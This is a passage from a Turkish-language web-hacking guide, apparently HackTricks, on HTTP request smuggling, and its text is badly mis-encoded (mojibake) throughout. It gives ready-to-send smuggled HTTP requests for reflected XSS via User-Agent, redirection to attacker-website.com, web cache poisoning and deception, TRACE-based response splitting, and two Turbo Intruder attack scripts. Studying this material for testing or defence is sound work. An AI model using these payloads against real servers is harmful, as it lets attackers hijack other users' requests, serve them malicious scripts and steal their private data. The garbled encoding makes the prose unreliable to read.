Ancak, bu tekniÄŸin sÄ±nÄ±rlamalarÄ± vardÄ±r. Genel olarak, yalnÄ±zca kaÃ§ak istekte kullanÄ±lan parametre ayÄ±rÄ±cÄ±ya kadar veri yakalar. URL kodlu form gÃ¶nderimleri iÃ§in bu ayÄ±rÄ±cÄ± `&` karakteridir. Bu, maÄŸdur kullanÄ±cÄ±nÄ±n isteÄŸinden yakalanan iÃ§eriÄŸin ilk `&` ile duracaÄŸÄ± anlamÄ±na gelir; bu, sorgu dizesinin bir parÃ§asÄ± bile olabilir.

AyrÄ±ca, bu yaklaÅŸÄ±mÄ±n TE.CL zafiyeti ile de geÃ§erli olduÄŸunu belirtmek gerekir. Bu tÃ¼r durumlarda, istek `search=\r\n0` ile sona ermelidir. SatÄ±r sonu karakterlerinden baÄŸÄ±msÄ±z olarak, deÄŸerler arama parametresine eklenecektir.

### HTTP istek kaÃ§akÃ§Ä±lÄ±ÄŸÄ±nÄ± yansÄ±yan XSS'i istismar etmek iÃ§in kullanma

HTTP Request Smuggling, **YansÄ±yan XSS**'e karÅŸÄ± savunmasÄ±z web sayfalarÄ±nÄ± istismar etmek iÃ§in kullanÄ±labilir ve Ã¶nemli avantajlar sunar:

* Hedef kullanÄ±cÄ±larla **etkileÅŸim gerektirmez**.
* HTTP istek baÅŸlÄ±klarÄ± gibi **normalde ulaÅŸÄ±lamayan** istek bÃ¶lÃ¼mlerinde XSS'in istismarÄ±na olanak tanÄ±r.

Bir web sitesinin User-Agent baÅŸlÄ±ÄŸÄ± aracÄ±lÄ±ÄŸÄ±yla YansÄ±yan XSS'e karÅŸÄ± savunmasÄ±z olduÄŸu senaryolarda, aÅŸaÄŸÄ±daki yÃ¼k, bu zafiyeti nasÄ±l istismar edeceÄŸini gÃ¶stermektedir:
```
POST / HTTP/1.1
Host: ac311fa41f0aa1e880b0594d008d009e.web-security-academy.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0
Cookie: session=ac311fa41f0aa1e880b0594d008d009e
Transfer-Encoding: chunked
Connection: keep-alive
Content-Length: 213
Content-Type: application/x-www-form-urlencoded

0

GET /post?postId=2 HTTP/1.1
Host: ac311fa41f0aa1e880b0594d008d009e.web-security-academy.net
User-Agent: "><script>alert(1)</script>
Content-Length: 10
Content-Type: application/x-www-form-urlencoded

A=
```
Bu yÃ¼k, aÃ§Ä±ÄŸÄ± istismar etmek iÃ§in ÅŸu ÅŸekilde yapÄ±landÄ±rÄ±lmÄ±ÅŸtÄ±r:

1. Smuggling'in baÅŸlangÄ±cÄ±nÄ± belirtmek iÃ§in `Transfer-Encoding: chunked` baÅŸlÄ±ÄŸÄ± ile, gÃ¶rÃ¼nÃ¼ÅŸte tipik bir `POST` isteÄŸi baÅŸlatmak.
2. Chunked mesaj gÃ¶vdesinin sonunu iÅŸaret eden bir `0` ile devam etmek.
3. ArdÄ±ndan, `User-Agent` baÅŸlÄ±ÄŸÄ±na bir script, `<script>alert(1)</script>`, enjekte edilen bir smuggled `GET` isteÄŸi tanÄ±tmak; bu, sunucu bu sonraki isteÄŸi iÅŸlediÄŸinde XSS'yi tetikler.

`User-Agent`'Ä± smuggling ile manipÃ¼le ederek, yÃ¼k normal istek kÄ±sÄ±tlamalarÄ±nÄ± aÅŸar ve bÃ¶ylece yansÄ±tÄ±lan XSS aÃ§Ä±ÄŸÄ±nÄ± standart dÄ±ÅŸÄ± ama etkili bir ÅŸekilde istismar eder.

#### HTTP/0.9

{% hint style="danger" %}
KullanÄ±cÄ± iÃ§eriÄŸi, **`Content-type`** gibi bir yanÄ±t iÃ§inde yansÄ±tÄ±ldÄ±ÄŸÄ±nda **`text/plain`**, XSS'nin Ã§alÄ±ÅŸmasÄ±nÄ± engeller. EÄŸer sunucu **HTTP/0.9** destekliyorsa, bunu aÅŸmak mÃ¼mkÃ¼n olabilir!
{% endhint %}

HTTP/0.9 sÃ¼rÃ¼mÃ¼, 1.0'dan Ã¶nceydi ve yalnÄ±zca **GET** fiillerini kullanÄ±r ve **baÅŸlÄ±klar** ile yanÄ±t vermez, sadece gÃ¶vdeyi kullanÄ±r.

[**bu yazÄ±da**](https://mizu.re/post/twisty-python), bir istek smuggling ile ve **kullanÄ±cÄ±nÄ±n giriÅŸi ile yanÄ±t verecek bir aÃ§Ä±k uÃ§ noktasÄ±** ile istismar edildi; HTTP/0.9 ile bir istek smuggling yapmak iÃ§in. YanÄ±tta yansÄ±tÄ±lacak parametre, **geÃ§ersiz bir HTTP/1.1 yanÄ±tÄ± (baÅŸlÄ±klar ve gÃ¶vde ile)** iÃ§eriyordu, bÃ¶ylece yanÄ±t geÃ§erli Ã§alÄ±ÅŸtÄ±rÄ±labilir JS kodu iÃ§erecek ve `Content-Type` olarak `text/html` olacaktÄ±r.

### HTTP Ä°steÄŸi Smuggling ile Yerinde YÃ¶nlendirmeleri Ä°stismar Etme <a href="#exploiting-on-site-redirects-with-http-request-smuggling" id="exploiting-on-site-redirects-with-http-request-smuggling"></a>

Uygulamalar genellikle yÃ¶nlendirme URL'sindeki `Host` baÅŸlÄ±ÄŸÄ±ndan hostname kullanarak bir URL'den diÄŸerine yÃ¶nlendirir. Bu, Apache ve IIS gibi web sunucularÄ±nda yaygÄ±ndÄ±r. Ã–rneÄŸin, bir klasÃ¶rÃ¼ sonuna eÄŸik Ã§izgi olmadan istemek, eÄŸik Ã§izgiyi dahil etmek iÃ§in bir yÃ¶nlendirme ile sonuÃ§lanÄ±r:
```
GET /home HTTP/1.1
Host: normal-website.com
```
SonuÃ§lar:
```
HTTP/1.1 301 Moved Permanently
Location: https://normal-website.com/home/
```
GÃ¶rÃ¼nÃ¼ÅŸte zararsÄ±z olan bu davranÄ±ÅŸ, kullanÄ±cÄ±larÄ± harici bir siteye yÃ¶nlendirmek iÃ§in HTTP request smuggling kullanÄ±larak manipÃ¼le edilebilir. Ã–rneÄŸin:
```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 54
Connection: keep-alive
Transfer-Encoding: chunked

0

GET /home HTTP/1.1
Host: attacker-website.com
Foo: X
```
Bu kaÃ§ak istek, sonraki iÅŸlenen kullanÄ±cÄ± isteÄŸinin bir saldÄ±rgan kontrolÃ¼ndeki web sitesine yÃ¶nlendirilmesine neden olabilir:
```
GET /home HTTP/1.1
Host: attacker-website.com
Foo: XGET /scripts/include.js HTTP/1.1
Host: vulnerable-website.com
```
SonuÃ§lar:
```
HTTP/1.1 301 Moved Permanently
Location: https://attacker-website.com/home/
```
Bu senaryoda, bir kullanÄ±cÄ±nÄ±n JavaScript dosyasÄ± iÃ§in isteÄŸi ele geÃ§irilir. SaldÄ±rgan, kÃ¶tÃ¼ niyetli JavaScript sunarak kullanÄ±cÄ±yÄ± tehlikeye atabilir.

### HTTP Request Smuggling ile Web Cache Poisoning SÃ¶mÃ¼rÃ¼sÃ¼ <a href="#exploiting-web-cache-poisoning-via-http-request-smuggling" id="exploiting-web-cache-poisoning-via-http-request-smuggling"></a>

Web cache poisoning, **Ã¶n uÃ§ altyapÄ±sÄ±nÄ±n iÃ§erik Ã¶nbelleÄŸe almasÄ±** durumunda gerÃ§ekleÅŸtirilebilir; bu genellikle performansÄ± artÄ±rmak iÃ§in yapÄ±lÄ±r. Sunucunun yanÄ±tÄ±nÄ± manipÃ¼le ederek, **Ã¶nbelleÄŸi zehirlemek** mÃ¼mkÃ¼ndÃ¼r.

Daha Ã¶nce, sunucu yanÄ±tlarÄ±nÄ±n 404 hatasÄ± dÃ¶necek ÅŸekilde nasÄ±l deÄŸiÅŸtirilebileceÄŸini gÃ¶zlemledik (bkz. [Temel Ã–rnekler](./#basic-examples)). Benzer ÅŸekilde, sunucuyu `/static/include.js` isteÄŸine yanÄ±t olarak `/index.html` iÃ§eriÄŸi sunmaya kandÄ±rmak mÃ¼mkÃ¼ndÃ¼r. SonuÃ§ olarak, `/static/include.js` iÃ§eriÄŸi Ã¶nbellekte `/index.html` ile deÄŸiÅŸtirilir, bu da `/static/include.js`'nin kullanÄ±cÄ±lara eriÅŸilemez hale gelmesine neden olur ve bu durum bir Hizmet Reddi (DoS) ile sonuÃ§lanabilir.

Bu teknik, bir **AÃ§Ä±k YÃ¶nlendirme aÃ§Ä±ÄŸÄ±** keÅŸfedildiÄŸinde veya **aÃ§Ä±k yÃ¶nlendirmeye yerel bir yÃ¶nlendirme** olduÄŸunda Ã¶zellikle gÃ¼Ã§lÃ¼ hale gelir. Bu tÃ¼r aÃ§Ä±klar, saldÄ±rganÄ±n kontrolÃ¼ndeki bir script ile `/static/include.js`'nin Ã¶nbelleÄŸe alÄ±nmÄ±ÅŸ iÃ§eriÄŸini deÄŸiÅŸtirmek iÃ§in sÃ¶mÃ¼rÃ¼lebilir ve bu da gÃ¼ncellenmiÅŸ `/static/include.js`'yi talep eden tÃ¼m istemcilere karÅŸÄ± yaygÄ±n bir Cross-Site Scripting (XSS) saldÄ±rÄ±sÄ±na olanak tanÄ±r.

AÅŸaÄŸÄ±da, **Ã¶nbellek zehirlenmesi ile aÃ§Ä±k yÃ¶nlendirmeye yerel bir yÃ¶nlendirme** kombinasyonunun sÃ¶mÃ¼rÃ¼lmesine dair bir illÃ¼strasyon bulunmaktadÄ±r. AmaÃ§, saldÄ±rgan tarafÄ±ndan kontrol edilen JavaScript kodunu sunmak iÃ§in `/static/include.js`'nin Ã¶nbellek iÃ§eriÄŸini deÄŸiÅŸtirmektir:
```
POST / HTTP/1.1
Host: vulnerable.net
Content-Type: application/x-www-form-urlencoded
Connection: keep-alive
Content-Length: 124
Transfer-Encoding: chunked

0

GET /post/next?postId=3 HTTP/1.1
Host: attacker.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x=1
```
Not edin ki, `/post/next?postId=3` hedefleyen gÃ¶mÃ¼lÃ¼ istek var. Bu istek, **Host baÅŸlÄ±k deÄŸeri** kullanÄ±larak `/post?postId=4` adresine yÃ¶nlendirilecektir. **Host baÅŸlÄ±ÄŸÄ±nÄ±** deÄŸiÅŸtirerek, saldÄ±rgan isteÄŸi kendi alanÄ±na yÃ¶nlendirebilir (**yerinde yÃ¶nlendirme ile aÃ§Ä±k yÃ¶nlendirme**).

BaÅŸarÄ±lÄ± bir **socket poisoning** sonrasÄ±nda, `/static/include.js` iÃ§in bir **GET isteÄŸi** baÅŸlatÄ±lmalÄ±dÄ±r. Bu istek, Ã¶nceki **yerinde yÃ¶nlendirme ile aÃ§Ä±k yÃ¶nlendirme** isteÄŸi tarafÄ±ndan kirletilecek ve saldÄ±rgan tarafÄ±ndan kontrol edilen scriptin iÃ§eriÄŸini alacaktÄ±r.

SonrasÄ±nda, `/static/include.js` iÃ§in yapÄ±lan her istek, saldÄ±rganÄ±n scriptinin Ã¶nbelleÄŸe alÄ±nmÄ±ÅŸ iÃ§eriÄŸini sunacak ve etkili bir geniÅŸ XSS saldÄ±rÄ±sÄ±nÄ± baÅŸlatacaktÄ±r.

### HTTP istek kaÃ§Ä±rma kullanarak web Ã¶nbellek aldatmasÄ± gerÃ§ekleÅŸtirme <a href="#using-http-request-smuggling-to-perform-web-cache-deception" id="using-http-request-smuggling-to-perform-web-cache-deception"></a>

> **Web Ã¶nbellek zehirlenmesi ile web Ã¶nbellek aldatmasÄ± arasÄ±ndaki fark nedir?**
>
> * **Web Ã¶nbellek zehirlenmesi** durumunda, saldÄ±rgan uygulamanÄ±n Ã¶nbellekte bazÄ± kÃ¶tÃ¼ niyetli iÃ§erikleri saklamasÄ±na neden olur ve bu iÃ§erik diÄŸer uygulama kullanÄ±cÄ±larÄ±na Ã¶nbellekten sunulur.
> * **Web Ã¶nbellek aldatmasÄ±** durumunda, saldÄ±rgan uygulamanÄ±n baÅŸka bir kullanÄ±cÄ±ya ait bazÄ± hassas iÃ§erikleri Ã¶nbellekte saklamasÄ±na neden olur ve saldÄ±rgan daha sonra bu iÃ§eriÄŸi Ã¶nbellekten alÄ±r.

SaldÄ±rgan, hassas kullanÄ±cÄ±ya Ã¶zel iÃ§eriÄŸi alacak ÅŸekilde kaÃ§Ä±rÄ±lmÄ±ÅŸ bir istek hazÄ±rlar. AÅŸaÄŸÄ±daki Ã¶rneÄŸi dÃ¼ÅŸÃ¼nÃ¼n:
```markdown
`POST / HTTP/1.1`\
`Host: vulnerable-website.com`\
`Connection: keep-alive`\
`Content-Length: 43`\
`Transfer-Encoding: chunked`\
``\ `0`\``\
`GET /private/messages HTTP/1.1`\
`Foo: X`
```
EÄŸer bu kaÃ§ak istek, statik iÃ§erik iÃ§in tasarlanmÄ±ÅŸ bir Ã¶nbellek giriÅŸini zehirliyorsa (Ã¶rneÄŸin, `/someimage.png`), maÄŸdurun `/private/messages` adresindeki hassas verileri statik iÃ§eriÄŸin Ã¶nbellek giriÅŸi altÄ±nda Ã¶nbelleÄŸe alÄ±nabilir. SonuÃ§ olarak, saldÄ±rgan bu Ã¶nbelleÄŸe alÄ±nmÄ±ÅŸ hassas verilere eriÅŸim saÄŸlayabilir.

### HTTP Request Smuggling ile TRACE Ä°stismar Etme <a href="#exploiting-web-cache-poisoning-via-http-request-smuggling" id="exploiting-web-cache-poisoning-via-http-request-smuggling"></a>

[**Bu yazÄ±da**](https://portswigger.net/research/trace-desync-attack) eÄŸer sunucuda TRACE yÃ¶ntemi etkinse, bunun HTTP Request Smuggling ile istismar edilebileceÄŸi Ã¶nerilmektedir. Bunun nedeni, bu yÃ¶ntemin sunucuya gÃ¶nderilen herhangi bir baÅŸlÄ±ÄŸÄ± yanÄ±tÄ±n gÃ¶vdesinin bir parÃ§asÄ± olarak yansÄ±tmasÄ±dÄ±r. Ã–rneÄŸin:
```
TRACE / HTTP/1.1
Host: example.com
XSS: <script>alert("TRACE")</script>
```
GÃ¶nderecek bir yanÄ±t ÅŸÃ¶yle olacak:
```
HTTP/1.1 200 OK
Content-Type: message/http
Content-Length: 115

TRACE / HTTP/1.1
Host: vulnerable.com
XSS: <script>alert("TRACE")</script>
X-Forwarded-For: xxx.xxx.xxx.xxx
```
Bir davranÄ±ÅŸÄ± kÃ¶tÃ¼ye kullanma Ã¶rneÄŸi, **Ã¶nce bir HEAD isteÄŸi sÄ±zdÄ±rmak** olacaktÄ±r. Bu istek, yalnÄ±zca bir GET isteÄŸinin **baÅŸlÄ±klarÄ±yla** yanÄ±tlanacaktÄ±r (**`Content-Type`** bunlar arasÄ±nda). Ve **HEAD'den hemen sonra bir TRACE isteÄŸi sÄ±zdÄ±rmak**, bu istek **gÃ¶nderilen verileri yansÄ±tacaktÄ±r**.\
HEAD yanÄ±tÄ± bir `Content-Length` baÅŸlÄ±ÄŸÄ± iÃ§ereceÄŸinden, **TRACE isteÄŸinin yanÄ±tÄ± HEAD yanÄ±tÄ±nÄ±n gÃ¶vdesi olarak iÅŸlenecek ve bu nedenle yanÄ±t iÃ§inde rastgele verileri yansÄ±tacaktÄ±r**. \
Bu yanÄ±t, baÄŸlantÄ± Ã¼zerindeki bir sonraki isteÄŸe gÃ¶nderilecektir, bu nedenle bu, **Ã¶rneÄŸin rastgele JS kodu enjekte etmek iÃ§in Ã¶nbelleÄŸe alÄ±nmÄ±ÅŸ bir JS dosyasÄ±nda kullanÄ±labilir**.

### HTTP YanÄ±t BÃ¶lme ile TRACE KÃ¶tÃ¼ye KullanÄ±mÄ± <a href="#exploiting-web-cache-poisoning-via-http-request-smuggling" id="exploiting-web-cache-poisoning-via-http-request-smuggling"></a>

[**bu gÃ¶nderiyi**](https://portswigger.net/research/trace-desync-attack) takip etmeye devam etmek, TRACE yÃ¶ntemini kÃ¶tÃ¼ye kullanmanÄ±n baÅŸka bir yolunu Ã¶nermektedir. YorumlandÄ±ÄŸÄ± gibi, bir HEAD isteÄŸi ve bir TRACE isteÄŸi sÄ±zdÄ±rarak, HEAD isteÄŸine yanÄ±t olarak **yansÄ±tÄ±lan bazÄ± verileri kontrol etmek** mÃ¼mkÃ¼ndÃ¼r. HEAD isteÄŸinin gÃ¶vdesinin uzunluÄŸu esasen Content-Length baÅŸlÄ±ÄŸÄ±nda belirtilmiÅŸtir ve TRACE isteÄŸine verilen yanÄ±tla oluÅŸmaktadÄ±r.

Bu nedenle, yeni fikir, bu Content-Length ve TRACE yanÄ±tÄ±nda verilen verileri bilerek, TRACE yanÄ±tÄ±nÄ±n Content-Length'in son baytÄ±ndan sonra geÃ§erli bir HTTP yanÄ±tÄ± iÃ§ermesini saÄŸlamak, bir saldÄ±rganÄ±n bir sonraki yanÄ±ta (bu, bir Ã¶nbellek zehirlemesi gerÃ§ekleÅŸtirmek iÃ§in kullanÄ±labilir) tamamen kontrol etmesine olanak tanÄ±maktÄ±r.

Ã–rnek:
```
GET / HTTP/1.1
Host: example.com
Content-Length: 360

HEAD /smuggled HTTP/1.1
Host: example.com

POST /reflect HTTP/1.1
Host: example.com

SOME_PADDINGXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXHTTP/1.1 200 Ok\r\n
Content-Type: text/html\r\n
Cache-Control: max-age=1000000\r\n
Content-Length: 44\r\n
\r\n
<script>alert("response splitting")</script>
```
Bu yanÄ±tlarÄ± Ã¼retecektir (HEAD yanÄ±tÄ±nÄ±n bir Content-Length'e sahip olduÄŸunu ve TRACE yanÄ±tÄ±nÄ±n HEAD gÃ¶vdesinin bir parÃ§asÄ± olduÄŸunu, HEAD Content-Length'i sona erdiÄŸinde geÃ§erli bir HTTP yanÄ±tÄ±nÄ±n sÄ±zdÄ±rÄ±ldÄ±ÄŸÄ±nÄ± not edin):
```
HTTP/1.1 200 OK
Content-Type: text/html
Content-Length: 0

HTTP/1.1 200 OK
Content-Type: text/html
Content-Length: 165

HTTP/1.1 200 OK
Content-Type: text/plain
Content-Length: 243

SOME_PADDINGXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXHTTP/1.1 200 Ok
Content-Type: text/html
Cache-Control: max-age=1000000
Content-Length: 50

<script>alert(â€œarbitrary responseâ€)</script>
```
### HTTP Ä°stek KaÃ§Ä±rmayÄ± HTTP YanÄ±t Senkronizasyonu ile SilahlandÄ±rma

Bir HTTP Ä°stek KaÃ§Ä±rma aÃ§Ä±ÄŸÄ± buldunuz ve bunu nasÄ±l istismar edeceÄŸinizi bilmiyorsunuz. Bu diÄŸer istismar yÃ¶ntemlerini deneyin:

{% content-ref url="../http-response-smuggling-desync.md" %}
[http-response-smuggling-desync.md](../http-response-smuggling-desync.md)
{% endcontent-ref %}

### DiÄŸer HTTP Ä°stek KaÃ§Ä±rma Teknikleri

* TarayÄ±cÄ± HTTP Ä°stek KaÃ§Ä±rma (Ä°stemci TarafÄ±)

{% content-ref url="browser-http-request-smuggling.md" %}
[browser-http-request-smuggling.md](browser-http-request-smuggling.md)
{% endcontent-ref %}

* HTTP/2 DÃ¼ÅŸÃ¼rmelerinde Ä°stek KaÃ§Ä±rma

{% content-ref url="request-smuggling-in-http-2-downgrades.md" %}
[request-smuggling-in-http-2-downgrades.md](request-smuggling-in-http-2-downgrades.md)
{% endcontent-ref %}

## Turbo saldÄ±rgan betikleri

### CL.TE

From [https://hipotermia.pw/bb/http-desync-idor](https://hipotermia.pw/bb/http-desync-idor)
```python
def queueRequests(target, wordlists):

engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=5,
requestsPerConnection=1,
resumeSSL=False,
timeout=10,
pipeline=False,
maxRetriesPerRequest=0,
engine=Engine.THREADED,
)
engine.start()

attack = '''POST / HTTP/1.1
Transfer-Encoding: chunked
Host: xxx.com
Content-Length: 35
Foo: bar

0

GET /admin7 HTTP/1.1
X-Foo: k'''

engine.queue(attack)

victim = '''GET / HTTP/1.1
Host: xxx.com

'''
for i in range(14):
engine.queue(victim)
time.sleep(0.05)

def handleResponse(req, interesting):
table.add(req)
```
### TE.CL

From: [https://hipotermia.pw/bb/http-desync-account-takeover](https://hipotermia.pw/bb/http-desync-account-takeover)
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=5,
requestsPerConnection=1,
resumeSSL=False,
timeout=10,
pipeline=False,
maxRetriesPerRequest=0,
engine=Engine.THREADED,
)
engine.start()

attack = '''POST / HTTP/1.1
Host: xxx.com
Content-Length: 4
Transfer-Encoding : chunked

46
POST /nothing HTTP/1.1
Host: xxx.com
Content-Length: 15

kk
0

'''
engine.queue(attack)

victim = '''GET / HTTP/1.1
Host: xxx.com

'''
for i in range(14):
engine.queue(victim)
time.sleep(0.05)


def handleResponse(req, interesting):
table.add(req)
```
## AraÃ§lar

* [https://github.com/anshumanpattnaik/http-request-smuggling](https://github.com/anshumanpattnaik/http-request-smuggling)
* [https://github.com/PortSwigger/http-request-smuggler](https://github.com/PortSwigger/http-request-smuggler)
* [https://github.com/gwen001/pentest-tools/blob/master/smuggler.py](https://github.com/gwen001/pentest-tools/blob/master/smuggler.py)
* [https://github.com/defparam/smuggler](https://github.com/defparam/smuggler)
* [https://github.com/Moopinger/smugglefuzz](https://github.com/Moopinger/smugglefuzz)
* [https://github.com/bahruzjabiyev/t-reqs-http-fuzzer](https://github.com/bahruzjabiyev/t-reqs-http-fuzzer): Bu araÃ§, garip istek kaÃ§Ä±rma tutarsÄ±zlÄ±klarÄ±nÄ± bulmak iÃ§in yararlÄ± olan dil bilgisi tabanlÄ± bir HTTP Fuzzer'dÄ±r.

## Referanslar

* [https://portswigger.net/web-security/request-smuggling](https://portswigger.net/web-security/request-smuggling)
* [https://portswigger.net/web-security/request-smuggling/finding](https://portswigger.net/web-security/request-smuggling/finding)
* [https://portswigger.net/web-security/request-smuggling/exploiting](https://portswigger.net/web-security/request-smuggling/exploiting)
* [https://medium.com/cyberverse/http-request-smuggling-in-plain-english-7080e48df8b4](https://medium.com/cyberverse/http-request-smuggling-in-plain-english-7080e48df8b4)
* [https://github.com/haroonawanofficial/HTTP-Desync-Attack/](https://github.com/haroonawanofficial/HTTP-Desync-Attack/)
* [https://memn0ps.github.io/2019/11/02/HTTP-Request-Smuggling-CL-TE.html](https://memn0ps.github.io/2019/11/02/HTTP-Request-Smuggling-CL-TE.html)
* [https://standoff365.com/phdays10/schedule/tech/http-request-smuggling-via-higher-http-versions/](https://standoff365.com/phdays10/schedule/tech/http-request-smuggling-via-higher-http-versions/)
* [https://portswigger.net/research/trace-desync-attack](https://portswigger.net/research/trace-desync-attack)

{% hint style="success" %}
AWS Hacking Ã¶ÄŸrenin ve pratik yapÄ±n:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP Hacking Ã¶ÄŸrenin ve pratik yapÄ±n: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarÄ±nÄ±**](https://github.com/sponsors/carlospolop) kontrol edin!
* **ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n ya da **Twitter**'da **bizi takip edin** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Hacking ipuÃ§larÄ±nÄ± paylaÅŸmak iÃ§in** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gÃ¶nderin.

</details>
{% endhint %}
